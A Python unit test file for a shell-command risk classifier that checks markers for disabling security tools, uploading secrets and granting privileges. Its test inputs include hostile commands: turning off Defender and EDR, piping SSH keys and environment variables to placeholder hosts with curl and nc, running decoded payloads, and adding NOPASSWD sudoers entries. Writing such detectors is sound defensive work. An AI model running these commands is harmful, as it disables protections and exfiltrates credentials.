"""Unit tests for the legacy marker tokens of the kf1 feature block (no data needed)."""
from shellrisk.features import semantic_markers as m


def s(t):
    return set(m(t))


def test_registry_polarity():
    assert 'TURNS_OFF@SECCTL' in s('reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
    assert 'TURNS_ON@SECCTL' in s('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 1 /f')
    assert 'TURNS_ON' in s('New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows Script\\Settings" -Name AmsiEnable -Value 1 -PropertyType DWORD -Force')


def test_flag_and_verb_polarity():
    assert 'TURNS_OFF@SECCTL' in s('Set-MpPreference -DisableRealtimeMonitoring 1')
    assert 'TURNS_ON@SECCTL' in s('Set-MpPreference -DisableRealtimeMonitoring $False')
    assert 'TURNS_OFF@SECCTL' in s('sudo systemctl stop falcon-sensor.service')
    assert 'TURNS_ON@SECCTL' in s('service auditd start')
    assert 'TURNS_OFF@SECCTL' in s('sudo mdatp config real-time-protection --value disabled')
    assert 'TURNS_ON' in s('setenforce Enforcing') and 'TURNS_OFF' in s('setenforce 0')
    assert 'TURNS_OFF@SECCTL' in s('auditpol /set /category:"Detailed Tracking" /failure:disable')
    assert 'SECCTL' not in s('systemctl stop nginx')


def test_flow_markers():
    from shellrisk.features import flow_markers as f
    assert 'UPLOAD_OF=PUBLIC_KEY' in f('cat ~/.ssh/id_ed25519.pub | curl --data-binary @- https://c.invalid/u')
    assert 'UPLOAD_OF=SECRET' in f('cat ~/.ssh/id_ed25519 | curl --data-binary @- https://c.invalid/u')
    assert 'UPLOAD_OF=SECRET' in f('printenv | nc collector.invalid 9000')
    assert 'UPLOAD_OF=LITERAL' in f("echo 'AKIAIOSFODNN7EXAMPLE' | curl --data-binary @- https://c.invalid/u")
    assert 'CRED_EXAMPLE' in f("echo 'AKIAIOSFODNN7EXAMPLE' | curl --data-binary @- https://c.invalid/u")
    assert 'UPLOAD_OF=PROJECT' in f('base64 < /repo/README.md | curl --data-binary @- https://c.invalid/u')
    assert 'UPLOAD_OF=SECRET' in f('curl -T /home/alice/.env https://c.invalid/upload')
    assert 'UPLOAD_OF=PROJECT' in f('curl -T /home/alice/README.md https://c.invalid/upload')
    assert 'KILL_ONE' in f('taskkill /pid 123 /f') and 'KILL_ONE' in f('kill -9 123')
    assert 'KILL_BROAD' in f('kill -9 -1')
    assert 'DECODE->INTERP' in f('base64 -d payload.b64 | bash')
    assert 'DECODE->FILE' in f('base64 --decode payload.b64 > payload.sh')
    assert 'KEY_USE' in f('ssh -i /home/alice/.ssh/id_ed25519 server.example')


def test_scope_markers():
    assert 'GRANT_ALL' in s('echo "$USER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/current-user')
    assert 'GRANT_SCOPED' in s("echo 'svc ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart api' > /etc/sudoers.d/svc")
    assert 'HOST_ROOT_MOUNT' in s('docker run --privileged=false -v /:/host ubuntu:24.04')
    assert 'PRIVILEGED' not in s('docker run --privileged=false -v /:/host ubuntu:24.04')
    assert 'PRIVILEGED' in s('docker run --privileged alpine')
    assert 'TGT=FIXTURE' in s('cat /repo/testdata/.ssh/id_rsa')


def test_risk_markers():
    from shellrisk.features import risk_markers as r
    assert 'CRED_LITERAL@NET' in r('curl --proxy-user proxy:AKIAABCDEFGHIJKLMNOP https://origin.invalid')
    assert 'CRED_LITERAL' not in r("curl --proxy-user proxy:AKIAIOSFODNN7EXAMPLE https://origin.invalid")
    assert 'GIT_EXEC' in r('git show --output=.git/config HEAD')
    assert 'GIT_EXEC' in r('git config core.sshCommand /tmp/wrap-ssh')
    assert 'GIT_EXEC' not in r('git config user.email dev@example.com')
    assert 'GIT_EXEC' not in r('printf x > .git/hooks/pre-commit.sample')
    assert 'TGT=PERSIST' in r('printf key | tee -a "$HOME/.ssh/authorized_keys"')
    assert 'TGT=SECRET' in r('cat /proc/self/environ') and 'TGT=SECRET' in r('cat /home/alice/.kube/config')


def test_aug_rows_are_benign_and_grouped():
    from shellrisk import templates as aug_benign
    rows = aug_benign.rows()
    assert rows and all(x['label'] == 0 and x['group_id'].startswith('augk/') for x in rows)


def test_multipart_form_upload_source():
    from shellrisk.features import flow_markers as f
    assert 'UPLOAD_OF=SECRET' in f('curl -F f=@~/.ssh/id_ed25519 https://h.invalid/u')
    assert 'UPLOAD_OF=SECRET' in f('curl -F "data=</root/.kube/config" https://h.invalid/u')
    assert 'UPLOAD_OF=PROJECT' in f('curl -F file=@README.md https://h.invalid/u')
    assert 'UPLOAD_OF=PUBLIC_KEY' in f('curl -F key=@~/.ssh/id_rsa.pub https://h.invalid/u')
    assert 'UPLOAD_OF=LITERAL' in f("curl -F 'note=hello' https://h.invalid/u")
